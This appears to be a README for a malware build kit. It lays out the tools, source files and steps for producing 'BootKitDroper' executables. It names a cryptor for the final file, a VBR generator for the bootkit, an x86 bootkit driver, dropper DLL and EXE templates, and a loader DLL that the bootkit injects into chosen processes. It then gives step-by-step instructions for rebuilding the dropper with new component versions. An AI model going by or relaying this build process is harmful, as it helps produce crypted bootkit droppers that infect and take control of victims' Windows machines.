Build folder structure:

- Tools - packaging utilities
  - WhiteJoeBuild.exe - used to embed strings into DLLs and DLLs into EXEs
  - mystic.exe - cryptor for the final file ring3 version
  - BkGen.exe - VBR generation utility.
  - FJ.exe - File joining utility for bootkit install files.
  - BkPack.exe - utility used by FJ during bootkit build.
  Technically, performs compression

- SrcDir - Source files folder.
  Has to include:
  - bootkit project files. They all have 'bk' prefix
    - bkloader.sys - x86 bootkit driver. Copied with new bootkit versions.
    - BkSetup.dll - x86 building template for bootkit DLL installation file.
    - BkSetup.exe - x86 building template for bootkit EXE installation file.
    - bksetupdll.cfg - configuration file for building bootkit DLL installation file.
    - bksetupexe.cfg - configuration file for building bootkit EXE installation file.

  - Loader_dll.dll - working DLL that bootkit injects into specified processes.
  - WhiteJoe.dll   - dropper dll.
  - WhiteJoe.exe   - dropper exe.

- OutDir - Output folder. The folder is cleared when a new build is initiated.
  build results are stored here:
  - BootKitDroper_target-all_<BuildTimeStamp>.exe - final build file for all platforms.
  - BootKitDroper_target-xp_<BuildTimeStamp>.exe - final build file for XP platform.

RunBuildBkDroper.bat - batch file to start the build process.

How to make a new build:
- if you have new versions of files for the build - place them into SrcDir folder and rename them according to the naming convention for this folder(see above)

- run RunBuildBkDroper.bat

- review the build process output in the console.

- to close CMD screen press Enter.

Final file should be in the OutDir folder.